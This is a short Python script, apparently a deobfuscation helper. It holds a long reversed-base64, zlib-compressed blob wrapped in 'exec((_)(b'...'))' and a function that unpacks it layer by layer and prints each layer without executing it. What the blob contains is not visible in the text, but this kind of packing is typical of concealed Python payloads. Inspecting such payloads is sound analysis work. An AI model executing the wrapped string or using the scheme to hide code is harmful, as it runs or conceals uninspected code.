import zlib
import base64

data = b"exec((_)(b'==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'))"

# Lambda for decoding
_ = lambda __: zlib.decompress(base64.b64decode(__[::-1]))

def recursive_decode(encoded_string):
    """
    Recursively decode the given encoded string until the payload changes
    from the same type of string structure.
    """
    while True:
        try:
            # Decode using the lambda function
            decoded_data = _(encoded_string)

            # Print the decoded result
            decoded_text = decoded_data.decode('utf-8')
            print(decoded_text)

            # Check if the result starts with "exec((_)(b'"
            if decoded_text.startswith("exec((_)(b'"):
                # Extract the new encoded string from the decoded payload
                start_index = decoded_text.find("b'") + 2
                end_index = decoded_text.rfind("'")
                encoded_string = decoded_text[start_index:end_index].encode()
            else:
                print("\nDecoding completed. Final payload reached.")
                break
        except Exception as e:
            print(f"\nError during decoding: {e}")
            break

recursive_decode(data)
